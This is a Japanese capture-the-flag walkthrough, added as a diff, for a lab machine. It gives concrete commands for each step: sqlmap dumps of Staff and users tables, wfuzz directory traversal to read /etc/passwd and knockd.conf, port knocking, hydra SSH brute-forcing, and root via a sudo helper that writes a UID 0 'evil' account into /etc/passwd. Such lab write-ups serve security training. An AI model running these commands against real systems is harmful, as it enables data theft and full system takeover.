@@ -1,0 +1,51 @@
+### 論点
+- 特になし
+### keyword
+- sqkmap(post),ディレクトリトラバーサル,portKnock,hydra:ssh,/etc/passwdへの書込み
+### 参考
+- rootになる、testコマンドはコピーと同じでshenron1とおなじ
+
+## 攻略
+- nmapする
+  - ssh(22)がfilteredしてるのがわかる
+  - http(80)
+  - 特に有益な情報はない 
+- gobusterする
+  - いろいろサイト出てくるのでチェックする 
+  - login画面があるが、hydra,sqlmapか何を使うかはわからない。とりあえずsqlmapする
+- search.phpにsqlインジェクションできそう
+  - 適当な文字を入れてresult.phpをburpsuiteを起動してheaderリクエストをコピーする。別にブラウザのheaderでもできる。header部分の下にデータ部分を`search=unko`記入する
+  - `sqlmap -r req.txt --dbs --batch`
+  - `sqlmap -r req.txt -D Staff --tables`
+  - `sqlmap -r req.txt -D Staff -T Users --columns`
+  - `sqlmap -r req.txt -D Staff -T Users -C Username,Password --dump`
+    - `--dump-all`もあるが、これはテーブルの全部 
+- adminのパスワードがわかる
+- LFIを探す
+  - webサイトのmanageにアクセスすると下にfile not exist と出るので、wfuzzで探すと/?file=が出てくる
+  - `wfuzz -w /usr/share/wordlists/wfuzz/general/big.txt -u http://$IP/manage.php?FUZZ=../../../../../etc/passwd --hw 100 -b "PHPSESSID=~"`
+  - `?file=../../../../../etc/knockd.conf`でport knockingがわかる
+- `knock -v $IP 7469 8475 9842` 
+- 今度はsshのユーザを探す
+- sqlmapでユーザを探す
+  - `sqlmap -r req.txt -D users -T UserDetails -C username,password --dump --batch`
+  - `| marym | 3kf~ |`
+  - `| julied| 468~ |`
+  - こんな感じでコピーしてuser-pass.txtとして保存する
+  - `cat user-pass.txt | awk -F'|' '{print $2}' | tr -d ' ' > user.txt`
+  - users.txtとpassword.txtにわける
+- `hydra -L users.txt -P password.txt ssh://$IP`
+- janitorになる
+  - `ssh janitor@$IP`
+  - `id`はjanitorだけ
+  - `ls -l /home`ユーザはたくさんいるが、Permissionを見たら他のユーザ見れない
+  - SUIDするが何もない
+  - `sudo -l`もない
+  - janitorのホームの隠しファイルにパスワードがあるので、password.txtに追加して、もう一度hydra
+- fredfになる
+  - `su fredf`
+  - `sudo -l`をするとtestというコマンドができるのがわかる。testコマンドはpasswdに書き込みができるコマンドらしい
+- rootになる
+  - `openssl passwd -1 パスワード`をコピーして/tmp/akを作って、akに書く
+  - `evil:ハッシュ:0:0:root:/home/root:bin/bash`
+  - `sudo ./test /tmp/ak /etc/passwd`
